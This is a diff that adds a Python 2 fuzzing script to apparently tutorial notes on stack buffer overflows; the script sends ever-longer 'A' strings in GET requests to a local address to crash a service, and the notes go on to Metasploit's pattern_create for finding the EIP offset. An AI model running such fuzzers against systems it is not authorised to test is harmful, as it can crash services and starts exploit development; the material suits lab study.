@@ -7,6 +7,24 @@ Protection techniques
 
 Identification
     First step is to identify the vulnerability. You can debug the app and fuzz it with large buffers and identify a crash, crop the needed amount of data to a limited size.
+    *import socket
+
+# Create an array of buffers, from 10 to 2000, with increments of 20. buffer=["A"]
+counter = 100
+
+buffer = ["A"]
+
+while len(buffer) <= 30:
+    buffer.append("A" * counter)
+    counter = counter + 200
+
+for string in buffer:
+    print "Fuzzing with %s bytes" % len(string)
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    connect = s.connect(('192.168.0.9', 80))
+    #s.recv(1024)
+    s.send('GET ' + string)
+    s.close()*
     Second step is determine the exact amount of padding before the *EIP* instruction. You can generate a large string with unique characters with:
     *$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700*
 
